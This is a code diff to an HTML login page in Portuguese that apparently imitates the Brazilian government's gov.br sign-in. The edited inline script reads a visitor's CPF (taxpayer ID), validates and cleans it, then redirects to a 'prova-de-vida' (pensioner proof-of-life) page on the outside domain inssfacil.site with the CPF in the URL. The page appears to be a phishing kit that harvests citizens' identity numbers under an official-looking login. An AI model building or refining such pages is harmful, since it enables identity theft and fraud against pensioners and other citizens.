@@ -53,35 +53,39 @@
 					<div class="button-panel" id="login-button-panel">
 						<button id="enter-account-id" type="button" class="button-continuar" tabindex="2">Continuar</button>
 															<script>
-												document.getElementById("enter-account-id").addEventListener("click", function(event) {
-													event.preventDefault();
-													const cpf = document.getElementById("accountId").value;
-											
-													// Função para validar CPF
-													function validarCPF(cpf) {
-														cpf = cpf.replace(/[^\d]+/g, '');
-														if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
-														let soma = 0, resto;
-														for (let i = 1; i <= 9; i++) soma += parseInt(cpf.substring(i-1, i)) * (11 - i);
-														resto = (soma * 10) % 11;
-														if (resto === 10 || resto === 11) resto = 0;
-														if (resto !== parseInt(cpf.substring(9, 10))) return false;
-														soma = 0;
-														for (let i = 1; i <= 10; i++) soma += parseInt(cpf.substring(i-1, i)) * (12 - i);
-														resto = (soma * 10) % 11;
-														if (resto === 10 || resto === 11) resto = 0;
-														if (resto !== parseInt(cpf.substring(10, 11))) return false;
-														return true;
-													}
-											
-													if (validarCPF(cpf)) {
-														const url = `https://chat.inssfacil.site/prova-de-vida?cpf=${cpf}`;
-														window.location.href = url;
-													} else {
-														alert("CPF inválido. Por favor, insira um CPF válido.");
-													}
-												});
-											</script>
+    document.getElementById("enter-account-id").addEventListener("click", function(event) {
+        event.preventDefault();
+        let cpf = document.getElementById("accountId").value;
+
+        // Função para validar CPF
+        function validarCPF(cpf) {
+            cpf = cpf.replace(/[^\d]+/g, '');
+            if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
+            let soma = 0, resto;
+            for (let i = 1; i <= 9; i++) soma += parseInt(cpf.substring(i-1, i)) * (11 - i);
+            resto = (soma * 10) % 11;
+            if (resto === 10 || resto === 11) resto = 0;
+            if (resto !== parseInt(cpf.substring(9, 10))) return false;
+            soma = 0;
+            for (let i = 1; i <= 10; i++) soma += parseInt(cpf.substring(i-1, i)) * (12 - i);
+            resto = (soma * 10) % 11;
+            if (resto === 10 || resto === 11) resto = 0;
+            if (resto !== parseInt(cpf.substring(10, 11))) return false;
+            return true;
+        }
+
+        // Remove pontos e traços do CPF para validação e URL
+        cpf = cpf.replace(/[^\d]+/g, '');
+
+        if (validarCPF(cpf)) {
+            const url = `https://chat.inssfacil.site/prova-de-vida?cpf=${cpf}`;
+            window.location.href = url;
+        } else {
+            alert("CPF inválido. Por favor, insira um CPF válido.");
+        }
+    });
+</script>
+
 					</div>
 				</div>
 				<label id="title-outras-op">Outras opções de identificação:</label>
